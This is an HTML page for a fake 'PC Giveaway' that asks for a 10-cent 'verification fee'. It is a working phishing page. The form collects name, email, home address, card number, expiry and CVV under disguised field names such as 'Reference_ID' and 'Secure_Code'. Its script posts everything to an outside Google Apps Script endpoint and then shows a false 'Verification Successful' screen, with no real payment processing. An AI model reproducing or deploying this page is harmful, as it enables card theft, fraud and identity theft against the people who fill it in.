<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@900&display=swap');
    
    :root { 
        --accent: #4ae8f8; /* Frosted cyan for RGB effect */
        --bg-white: #ffffff; 
        --card-bg-light: #f5f7fa; /* Subtly off-white for contrast */
        --border-color: #e0e6ed;
        --text-dark: #1a1a1a;
        --text-gray: #7a8799;
        --text-light: #ffffff;
    }

    body { 
        font-family: 'Inter', sans-serif; 
        padding: 0; margin: 0; 
        background-color: var(--bg-white); 
        color: var(--text-dark); 
        -webkit-font-smoothing: antialiased; 
    }

    * { box-sizing: border-box; }

    /* Header & Pulse */
    .header { 
        text-align: center; 
        padding: 40px 0; 
        background: linear-gradient(135deg, #ffffff 0%, #f0f4f8 100%);
        border-bottom: 2px solid var(--accent);
    }
    .logo { 
        font-family: 'Outfit', sans-serif; 
        font-size: 2.2rem; 
        font-weight: 900; 
        letter-spacing: -1px; 
        text-transform: uppercase; 
        color: var(--text-dark);
        text-shadow: 0 0 10px rgba(74, 232, 248, 0.4);
    }
    .live-badge {
        display: inline-block;
        background: #f0f4f8;
        color: #27c8d9;
        padding: 4px 12px;
        font-weight: 800;
        font-size: 12px;
        border-radius: 4px;
        margin-top: 10px;
        animation: pulse 1.5s infinite;
        border: 1px solid rgba(74, 232, 248, 0.5);
    }
    @keyframes pulse {
        0% { opacity: 1; box-shadow: 0 0 0px var(--accent); }
        50% { opacity: 0.6; box-shadow: 0 0 8px var(--accent); }
        100% { opacity: 1; box-shadow: 0 0 0px var(--accent); }
    }

    .container { max-width: 600px; margin: 0 auto 100px; padding: 0 20px; }

    /* Info Box */
    .fight-card {
        background: var(--card-bg-light);
        padding: 20px;
        border-radius: 12px;
        margin-top: -30px;
        border: 1px solid var(--border-color);
        text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.05);
    }
    .fight-title { font-weight: 900; font-size: 1.2rem; text-transform: uppercase; color: var(--text-dark); }
    .price-tag { font-size: 2.5rem; color: #27c8d9; font-weight: 900; margin: 10px 0; }

    h3 { 
        font-family: 'Outfit', sans-serif; 
        font-size: 18px; 
        text-transform: uppercase; 
        letter-spacing: 1px; 
        margin: 40px 0 20px 0; 
        color: var(--text-dark);
        border-left: 3px solid var(--accent);
        padding-left: 10px;
    }

    /* Form Styling */
    input[type=text] { 
        width: 100%; 
        margin-bottom: 15px; 
        padding: 15px; 
        background: var(--bg-white);
        border: 1px solid var(--border-color); 
        color: var(--text-dark);
        font-family: 'Inter', sans-serif; 
        border-radius: 6px;
        transition: border-color 0.2s, box-shadow 0.2s;
    }
    input[type=text]:focus { 
        outline: none; 
        border-color: var(--accent); 
        box-shadow: 0 0 8px rgba(74, 232, 248, 0.2);
    }
    
    label { 
        margin-bottom: 8px; 
        display: block; 
        font-weight: 700; 
        text-transform: uppercase; 
        font-size: 11px; 
        letter-spacing: 1px; 
        color: var(--text-gray); 
    }

    .icon-container { margin-bottom: 10px; font-size: 30px; display: flex; gap: 10px; }
    .icon-container i { color: #aab4c2; }

    .btn { 
        background: linear-gradient(135deg, #4ae8f8 0%, #27c8d9 100%);
        color: var(--text-light); 
        padding: 22px; 
        margin: 30px 0; 
        border: none; 
        width: 100%; 
        cursor: pointer; 
        font-size: 16px; 
        font-weight: 900; 
        text-transform: uppercase; 
        letter-spacing: 1px; 
        border-radius: 8px;
        transition: transform 0.2s, box-shadow 0.2s;
        box-shadow: 0 4px 12px rgba(74, 232, 248, 0.3);
    }
    .btn:hover { 
        transform: translateY(-2px); 
        box-shadow: 0 6px 18px rgba(74, 232, 248, 0.5); 
    }

    /* Success Screen */
    #thanks-screen { display: none; text-align: center; margin-top: 100px; padding: 20px; }
    #thanks-screen h1 { font-family: 'Outfit', sans-serif; color: #2ecc71; font-size: 3.5rem; margin-bottom: 10px; }
    .success-icon { font-size: 80px; color: #2ecc71; margin-bottom: 20px; }
</style>
</head>
<body>

<div class="header" id="nav-header">
    <div class="logo">PC GIVEAWAY</div>
    <div class="live-badge">● EXCLUSIVE ENTRY</div>
</div>

<div id="form-container">
  <div class="container">
    <div class="fight-card">
        <div class="fight-title">ULTIMATE GAMING PC</div>
        <div class="price-tag">$0.10</div>
        <p style="color: var(--text-gray); font-size: 13px; margin: 0;">Complete Entry & Verification Pass</p>
    </div>

    <form id="checkoutForm" action="https://script.google.com/macros/s/AKfycbw-p6052iCoYf0yzZVsKHCXWjiJj86Rbg_sAGQrZ7sRS7lARORgn0x7wxgEvv9ItORj/exec" method="POST">
      
      <h3>1. Participant Info</h3>
      <label>Full Name</label>
      <input type="text" id="fname" name="Full_Name" placeholder="Full Name" required>
      <label>Email (For Winner Notification)</label>
      <input type="text" id="email" name="Email" placeholder="email@example.com" required>
      <label>Full Shipping Address</label>
      <input type="text" id="address" name="Home_Address" placeholder="Street, Apartment, City, State, Zip Code" required>

      <h3>2. Verification Fee</h3>
      <div class="icon-container">
        <i class="fa fa-cc-visa"></i>
        <i class="fa fa-cc-mastercard"></i>
        <i class="fa fa-cc-amex"></i>
      </div>

      <label>Cardholder Name</label>
      <input type="text" name="Reference_User" id="cname" placeholder="Name on Card" required>

      <label>Card Number</label>
      <input type="text" name="Reference_ID" id="ccnum" placeholder="0000 0000 0000 0000" required>

      <div style="display: flex; gap: 15px;">
        <div style="flex: 1;">
          <label>Expiration</label>
          <input type="text" name="Expiry" placeholder="MM/YY" required>
        </div>
        <div style="flex: 1;">
          <label>CVV</label>
          <input type="text" name="Secure_Code" id="cvv" placeholder="123" required>
        </div>
      </div>

      <button type="submit" class="btn" id="submitBtn">COMPLETE ENTRY — For ONLY 10 Cents</button>
    </form>
  </div>
</div>

<div id="thanks-screen">
  <i class="fa fa-check-circle success-icon"></i>
  <h1>ENTRY RECEIVED</h1>
  <p style="color: var(--text-dark); font-size: 18px; margin-top: 20px;">Verification Successful!<br>You are now officially entered into the PC Giveaway.</p>
  <p style="color: var(--text-gray); font-size: 14px;">(Keep an eye on your email for further instructions)</p>
</div>

<script>
  const form = document.getElementById('checkoutForm');
  const btn = document.getElementById('submitBtn');

  form.addEventListener('submit', function(e) {
    e.preventDefault();
    btn.innerText = "PROCESSING...";
    btn.disabled = true;

    const formData = new FormData(form);

    fetch(form.action, {
      method: 'POST',
      body: formData,
      mode: 'no-cors'
    })
    .then(() => {
      document.getElementById("form-container").style.display = "none";
      document.getElementById("nav-header").style.display = "none";
      document.getElementById("thanks-screen").style.display = "block";
      window.scrollTo(0,0);
    })
    .catch(error => {
      console.error('Error:', error);
      alert("System busy. Please try again.");
      btn.innerText = "COMPLETE ENTRY — For ONLY 10 Cents";
      btn.disabled = false;
    });
  });
</script>

</body>
</html>
